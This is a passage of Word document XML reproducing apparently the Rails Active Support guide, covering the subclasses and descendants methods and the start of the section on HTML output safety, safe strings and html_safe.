        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2880"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="404B6294" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="53B77F05" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>C; end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4190BDDB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>C.subclasses # =&gt; []</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="68D048A2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="197F5309" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>B</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt; C; end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="44A12E20" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>C.subclasses # =&gt; [B]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="767361C1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="437A2B0A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>A</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt; B; end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="40D1F746" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>C.subclasses # =&gt; [B]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="52080DB3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1A025AA1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>D</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt; C; end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="675B9AB8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>C.subclasses # =&gt; [B, D]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2711AA86" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The order in which these classes are returned is unspecified.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BC79997" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This method is redefined in some Rails core classes but should be all compatible in Rails 3.1.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="635C178F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/class/subclasses.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F00C3C1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>descendants</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B62B827" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>descendants</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method returns all classes that are </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> than its receiver:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3360"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="01A217F0" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="553F7F5E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>C; end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="000612C4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>C.descendants # =&gt; []</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="040AA5F9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="278E00D9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>B</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt; C; end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0DC35F98" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>C.descendants # =&gt; [B]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B36F48E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2650B71E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>A</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt; B; end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="018DB0FA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>C.descendants # =&gt; [B, A]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="33CB0757" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0EE56801" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>D</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt; C; end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11D3B3B6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>C.descendants # =&gt; [B, A, D]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="427D009B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The order in which these classes are returned is unspecified.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="508D1529" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/class/subclasses.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F71A13B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">5 Extensions to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>String</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55433E62" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>5.1 Output Safety</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FBD094D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>5.1.1 Motivation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="621A7E53" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Inserting data into </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> templates needs extra care. For example you can’t just interpolate </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@review.title</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> verbatim into an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> page. On one hand if the review title is “Flanagan &amp; Matz rules!” the output won’t be well-formed because an ampersand has to be escaped as “&amp;amp;”. On the other hand, depending on the application that may be a big security hole because users can inject malicious </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> setting a hand-crafted review title. Check out the </w:t>
      </w:r>
      <w:hyperlink r:id="rId493" w:anchor="cross-site-scripting-xss" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>section about cross-site scripting in the Security guide</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> for further information about the risks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D6D2E90" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>5.1.2 Safe Strings</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50A0202E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Active Support has the concept of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>(html) safe</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> strings since Rails 3. A safe string is one that is marked as being insertable into </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as is. It is trusted, no matter whether it has been escaped or not.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29FF64B2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Strings are considered to be </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>unsafe</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> by default:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2880"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="76E4CD9D" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="45C6CE4A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1627276753"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"".html_safe? # =&gt; false</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="42B0ECFB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can obtain a safe string from a given one with the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>html_safe</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2640"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="07093477" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="18803739" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>s = "".html_safe</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09D3379D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>s.html_safe? # =&gt; true</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="072E7613" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">It is important to understand that </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>html_safe</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> performs no escaping whatsoever, it is just an assertion:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6120"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="50A10A97" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1C747D43" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>s = "&lt;script&gt;...&lt;/script&gt;".html_safe</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3BF63C52" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>s.html_safe? # =&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7074EC7A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>s            # =&gt; "&lt;script&gt;...&lt;/script&gt;"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4D202FE0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">It is your responsibility to ensure calling </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>html_safe</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> on a particular string is fine.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66D9893A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you append onto a safe string, either in-place with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>concat</w:t>
      </w:r>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>&lt;&lt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, or with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>+</w:t>
      </w:r>
      <w:r>
        <w:t>, the result is a safe string. Unsafe arguments are escaped:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3528"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="393F0EFC" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="427262A4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="832530103"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"".html_safe + "&lt;"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; "&amp;lt;"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="432EB87B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Safe arguments are directly appended:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4440"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="20809D2C" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="726825D7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="790443637"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
